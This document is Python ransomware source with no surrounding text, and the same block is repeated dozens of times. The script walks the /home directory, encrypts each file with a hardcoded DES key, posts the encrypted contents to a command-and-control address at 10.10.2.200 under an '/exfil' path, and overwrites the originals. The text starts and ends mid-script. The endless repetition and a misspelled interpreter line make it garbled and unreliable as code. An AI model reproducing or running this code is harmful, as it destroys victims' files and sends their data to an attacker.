KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
